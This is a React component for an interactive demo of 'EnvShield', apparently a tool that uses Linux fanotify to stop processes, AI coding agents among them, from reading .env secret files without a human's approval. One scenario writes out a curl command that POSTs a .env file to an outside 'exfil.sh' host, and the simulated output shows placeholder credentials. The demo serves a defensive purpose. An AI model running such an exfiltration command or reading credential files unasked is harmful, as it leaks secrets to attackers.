'use client';

import React, { useState } from 'react';
import { Shield, ShieldAlert, ShieldCheck, Terminal, Play, Key, X, Check, Lock, AlertTriangle } from 'lucide-react';

interface Scenario {
  id: string;
  name: string;
  caller: string;
  command: string;
  target: string;
  risk: string;
}

const SCENARIOS: Scenario[] = [
  {
    id: 'agent',
    name: 'Claude Code Agent',
    caller: 'claude-code (PID 4821)',
    command: 'cat /work/projects/fintech/.env',
    target: '/work/projects/fintech/.env',
    risk: 'Exposes production Stripe API keys & DB passwords into agent context and prompt logs.',
  },
  {
    id: 'cursor',
    name: 'Cursor AI Workspace Indexer',
    caller: 'cursor-server (PID 5912)',
    command: 'grep -rn "AWS_SECRET" ./',
    target: '/work/projects/cloud-vault/.env.production',
    risk: 'Embeds cloud credentials into local AI embeddings vectors.',
  },
  {
    id: 'script',
    name: 'Malicious npm postinstall',
    caller: 'node (PID 8391)',
    command: 'curl -X POST -d @.env https://exfil.sh/drop',
    target: '/work/app/.env',
    risk: 'Exfiltrates whole environment file over external network.',
  },
  {
    id: 'human',
    name: 'Legitimate Developer (You)',
    caller: 'nvim (PID 3144)',
    command: 'nvim /work/projects/saas/.env',
    target: '/work/projects/saas/.env',
    risk: 'Authorized manual configuration change.',
  },
];

export default function Simulator() {
  const [selectedScenario, setSelectedScenario] = useState<Scenario>(SCENARIOS[0]);
  const [isExecuting, setIsExecuting] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [logs, setLogs] = useState<string[]>([
    'envshield daemon running in background (fanotify class FAN_CLASS_CONTENT active)',
    'Mounted filesystem watch on root mount / with FAN_OPEN_PERM',
    'Ready. Select a scenario and click "Trigger File Access Attempt" below.',
  ]);
  const [statusState, setStatusState] = useState<'idle' | 'intercepted' | 'allowed' | 'denied'>('idle');

  const addLog = (msg: string) => {
    setLogs((prev) => [...prev, msg]);
  };

  const handleTrigger = () => {
    setIsExecuting(true);
    setStatusState('intercepted');
    setPasswordInput('');

    setLogs((prev) => [
      ...prev,
      `─────────────────────────────────────────────────────────────────`,
      `[PROCESS EXEC] ${selectedScenario.caller} spawned`,
      `[COMMAND] $ ${selectedScenario.command}`,
      `[KERNEL] openat(AT_FDCWD, "${selectedScenario.target}", O_RDONLY) invoked`,
      `[FANOTIFY] Target matches protected pattern '*.env*'. Intercepting syscall...`,
      `[KERNEL] ⏸️ Process ${selectedScenario.caller} FROZEN in kernel space.`,
      `[ENVSHIELD] Spawning desktop authorization modal to human display :0...`,
    ]);

    setTimeout(() => {
      setShowModal(true);
      setIsExecuting(false);
    }, 600);
  };

  const handleAuthorize = () => {
    setShowModal(false);
    if (passwordInput === 'admin' || passwordInput.length >= 4) {
      setStatusState('allowed');
      addLog(`[MODAL] Human entered master password: [MATCH Argon2id hash]`);
      addLog(`[ENVSHIELD] Response sent to Linux Kernel: FAN_ALLOW`);
      addLog(`[KERNEL] ▶️ Process resumed with valid file descriptor.`);
      addLog(`[OUTPUT] DATABASE_URL=postgres://admin:vault_s3cret_99@db:5432/prod`);
      addLog(`[OUTPUT] STRIPE_SECRET_KEY=sk_live_51M0x777...`);
      addLog(`[STATUS] ✅ Access GRANTED by authenticated developer.`);
    } else {
      handleDeny(true);
    }
  };

  const handleDeny = (wasIncorrect = false) => {
    setShowModal(false);
    setStatusState('denied');
    if (wasIncorrect) {
      addLog(`[MODAL] Master password validation FAILED: Invalid Argon2id signature`);
    } else {
      addLog(`[MODAL] Human clicked DENY / Cancel.`);
    }
    addLog(`[ENVSHIELD] Response sent to Linux Kernel: FAN_DENY`);
    addLog(`[KERNEL] Syscall aborted with return code -1 (errno: EACCES)`);
    addLog(`[PROCESS ERROR] cat: ${selectedScenario.target}: Permission denied`);
    addLog(`[AUDIT] 🔒 0 bytes leaked. Secret contents kept safe in kernel quarantine.`);
  };

  return (
    <div className="w-full bg-zinc-900/90 border border-zinc-800 rounded-2xl p-6 lg:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">
      {/* Delicate accent glow line */}
      <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-emerald-500 to-transparent opacity-80" />

      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
        <div>
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-medium mb-2">
            <Shield className="w-3.5 h-3.5" />
            Live Kernel Interception Simulation
          </div>
          <h2 className="text-2xl font-bold text-white tracking-tight">
            Interactive Testbed: AI Agent vs. Kernel Guard
          </h2>
          <p className="text-sm text-zinc-400">
            See how EnvShield halts unauthorized processes at the kernel boundary before a single byte of secrets can be read.
          </p>
        </div>

        {/* Status pill */}
        <div className="flex items-center gap-2">
          {statusState === 'idle' && (
            <span className="px-3 py-1.5 rounded-lg bg-zinc-800 border border-zinc-700 text-zinc-300 text-xs font-mono flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-zinc-400" /> Daemon Standing By
            </span>
          )}
          {statusState === 'intercepted' && (
            <span className="px-3 py-1.5 rounded-lg bg-amber-500/10 border border-amber-500/40 text-amber-300 text-xs font-mono flex items-center gap-1.5 animate-pulse">
              <span className="w-2 h-2 rounded-full bg-amber-400" /> Syscall Frozen in Kernel
            </span>
          )}
          {statusState === 'allowed' && (
            <span className="px-3 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/40 text-emerald-300 text-xs font-mono flex items-center gap-1.5">
              <ShieldCheck className="w-4 h-4 text-emerald-400" /> Access Authorized (FAN_ALLOW)
            </span>
          )}
          {statusState === 'denied' && (
            <span className="px-3 py-1.5 rounded-lg bg-red-500/10 border border-red-500/40 text-red-300 text-xs font-mono flex items-center gap-1.5">
              <ShieldAlert className="w-4 h-4 text-red-400" /> Blocked: Permission Denied (FAN_DENY)
            </span>
          )}
        </div>
      </div>

      {/* Scenario Selector */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 mb-6">
        {SCENARIOS.map((sc) => {
          const isSelected = selectedScenario.id === sc.id;
          return (
            <button
              key={sc.id}
              onClick={() => {
                setSelectedScenario(sc);
                setStatusState('idle');
              }}
              className={`p-3.5 rounded-xl border text-left transition-all relative ${
                isSelected
                  ? 'bg-zinc-800/90 border-emerald-500/60 shadow-[0_0_15px_-3px_rgba(16,185,129,0.2)]'
                  : 'bg-zinc-900/50 border-zinc-800 hover:border-zinc-700 text-zinc-400'
              }`}
            >
              <div className="font-semibold text-sm text-zinc-200 mb-1">{sc.name}</div>
              <div className="text-xs font-mono text-zinc-400 truncate mb-1">{sc.caller}</div>
              <div className="text-[11px] text-zinc-500 line-clamp-2 leading-relaxed">{sc.risk}</div>
            </button>
          );
        })}
      </div>

      {/* Action Bar */}
      <div className="flex flex-col sm:flex-row items-center justify-between gap-4 p-4 rounded-xl bg-zinc-950 border border-zinc-800 mb-6">
        <div className="flex items-center gap-3 w-full sm:w-auto">
          <Terminal className="w-5 h-5 text-emerald-400 shrink-0" />
          <div className="font-mono text-xs text-zinc-300 truncate">
            <span className="text-zinc-500">$</span> {selectedScenario.command}
          </div>
        </div>

        <button
          onClick={handleTrigger}
          disabled={isExecuting || showModal}
          className="w-full sm:w-auto px-5 py-2.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-bold text-sm flex items-center justify-center gap-2 transition-all shadow-[0_0_20px_-3px_rgba(16,185,129,0.4)] disabled:opacity-50"
        >
          <Play className="w-4 h-4 fill-zinc-950" />
          Trigger File Access Attempt
        </button>
      </div>

      {/* Simulated Terminal Log Stream */}
      <div className="rounded-xl bg-zinc-950 border border-zinc-800/80 p-4 font-mono text-xs overflow-hidden">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-2 mb-3 text-zinc-500 text-[11px]">
          <div className="flex items-center gap-2">
            <div className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
            <div className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
            <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
            <span className="ml-2 text-zinc-400">envshield kernel audit trail (/var/log/envshield.log)</span>
          </div>
          <button
            onClick={() => setLogs(['Daemon active. Ready.'])}
            className="text-zinc-500 hover:text-zinc-300 text-[10px] underline"
          >
            Clear Log
          </button>
        </div>

        <div className="space-y-1.5 max-h-56 overflow-y-auto pr-2">
          {logs.map((log, idx) => {
            let color = 'text-zinc-400';
            if (log.includes('[KERNEL]') || log.includes('[FANOTIFY]')) color = 'text-cyan-400 font-semibold';
            if (log.includes('FROZEN')) color = 'text-amber-400 font-bold';
            if (log.includes('GRANTED') || log.includes('FAN_ALLOW')) color = 'text-emerald-400 font-bold';
            if (log.includes('DENIED') || log.includes('Permission denied') || log.includes('FAN_DENY')) color = 'text-red-400 font-bold';
            if (log.includes('[OUTPUT]')) color = 'text-zinc-200 bg-zinc-900/60 px-2 py-0.5 rounded';

            return (
              <div key={idx} className={`${color} leading-relaxed`}>
                {log}
              </div>
            );
          })}
        </div>
      </div>

      {/* Simulated OS Modal Dialog Pop-up */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md animate-in fade-in zoom-in-95 duration-150">
          <div className="w-full max-w-md bg-zinc-900 border-2 border-emerald-500/80 rounded-2xl p-6 shadow-2xl relative">
            <div className="flex items-center justify-between pb-3 border-b border-zinc-800 mb-4">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
                  <Lock className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-white text-base leading-tight">EnvShield Security Intercept</h3>
                  <p className="text-xs text-zinc-400">Linux Kernel fanotify synchronous verification</p>
                </div>
              </div>
              <button
                onClick={() => handleDeny(false)}
                className="text-zinc-400 hover:text-white p-1 rounded-lg hover:bg-zinc-800"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="bg-zinc-950/70 border border-zinc-800/80 rounded-xl p-3.5 mb-4 text-xs font-mono space-y-1.5">
              <div className="flex justify-between">
                <span className="text-zinc-500">Calling Process:</span>
                <span className="text-amber-400 font-semibold">{selectedScenario.caller}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-zinc-500">Target File:</span>
                <span className="text-cyan-400 truncate max-w-[200px]">{selectedScenario.target}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-zinc-500">Action:</span>
                <span className="text-red-400 font-bold">READ_ACCESS</span>
              </div>
            </div>

            <div className="mb-5">
              <label className="block text-xs font-semibold text-zinc-300 mb-1.5">
                Enter Master Password to authorize this access:
              </label>
              <div className="relative">
                <input
                  type="password"
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  placeholder="Try typing 'admin' or test wrong password..."
                  className="w-full px-3.5 py-2.5 rounded-lg bg-zinc-950 border border-zinc-700 text-white font-mono text-sm focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition-all placeholder:text-zinc-600"
                  autoFocus
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') handleAuthorize();
                  }}
                />
                <Key className="w-4 h-4 text-zinc-500 absolute right-3 top-3" />
              </div>
              <p className="text-[11px] text-zinc-500 mt-1.5">
                💡 Demo hint: Type <code className="text-emerald-400">admin</code> to authorize, or click Deny to simulate an agent being blocked.
              </p>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => handleDeny(false)}
                className="flex-1 py-2.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-300 font-semibold text-xs transition-colors flex items-center justify-center gap-1.5"
              >
                <X className="w-4 h-4" />
                Deny Access (FAN_DENY)
              </button>

              <button
                onClick={handleAuthorize}
                className="flex-1 py-2.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-bold text-xs transition-all shadow-[0_0_15px_-2px_rgba(16,185,129,0.4)] flex items-center justify-center gap-1.5"
              >
                <Check className="w-4 h-4" />
                Authorize Once (FAN_ALLOW)
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
